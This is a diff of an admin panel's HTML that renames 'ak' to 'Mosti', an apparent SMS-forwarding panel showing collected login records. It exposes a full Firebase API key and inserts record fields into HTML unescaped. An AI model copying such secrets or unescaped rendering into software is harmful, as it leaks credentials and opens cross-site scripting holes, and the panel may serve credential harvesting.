@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ak panel</title>
+    <title>Mosti - SMS Forwarding Admin Panel</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         /* All your CSS remains exactly the same */
@@ -1700,7 +1700,7 @@
     <!-- Loading Screen -->
     <div id="loadingScreen" class="loading-screen">
         <div class="loading-spinner"></div>
-        <p>Loading ak Admin Panel...</p>
+        <p>Loading Mosti Admin Panel...</p>
     </div>
 
     <!-- AJAX Loader -->
@@ -1714,7 +1714,7 @@
     <!-- Setup Modal -->
     <div id="setupModal" class="setup-modal hidden">
         <div class="setup-content">
-            <h2><i class="fas fa-cog"></i> ak Setup</h2>
+            <h2><i class="fas fa-cog"></i> Mosti Setup</h2>
             <div class="form-group">
                 <label>Set Admin Password:</label>
                 <input type="password" id="setupPassword" placeholder="Enter admin password" class="form-input">
@@ -1729,13 +1729,13 @@
     <div id="loginModal" class="modal hidden">
         <div class="modal-content">
             <h2 style="text-align: center; margin-bottom: 20px; color: var(--primary);">
-                <i class="fas fa-lock"></i> ak
+                <i class="fas fa-lock"></i> Mosti Admin Login
             </h2>
             <div class="form-group">
                 <input type="password" id="adminPassword" placeholder="Enter Admin Password" class="form-input">
             </div>
             <button onclick="checkAdminPassword()" class="btn btn-primary" style="width: 100%;">
-                <i class="fas fa-sign-in-alt"></i> Login to ak
+                <i class="fas fa-sign-in-alt"></i> Login to Mosti
             </button>
         </div>
     </div>
@@ -2121,7 +2121,7 @@
     <script>
         // Firebase Configuration
         const firebaseConfig = {
-       apiKey: "AIzaSyBZCyD1KlBC593aVpYAzmPytoTwCB51f-w",
+          apiKey: "AIzaSyBZCyD1KlBC593aVpYAzmPytoTwCB51f-w",
     authDomain: "rt9weba.firebaseapp.com",
     databaseURL: "https://rt9weba-default-rtdb.firebaseio.com",
     projectId: "rt9weba",
@@ -3438,7 +3438,7 @@
                     let recordHTML = '<div class="login-record">';
                     let hasContent = false;
                     
-                    if (record.Name) { 
+                     if (record.Name) { 
                         recordHTML += `<div class="login-data-item"><span class="login-key">Name : </span><span class="login-value">${record.Name}</span></div>`;
                         hasContent = true;
                     }
@@ -3975,7 +3975,7 @@
                             let recordHTML = '<div class="login-record" style="margin-bottom: 15px; padding: 10px; background: var(--light); border-radius: var(--border-radius);">';
                             let hasContent = false;
                             
-                             if (record.Name) { 
+                              if (record.Name) { 
                         recordHTML += `<div class="login-data-item"><span class="login-key">Name : </span><span class="login-value">${record.Name}</span></div>`;
                         hasContent = true;
                     }
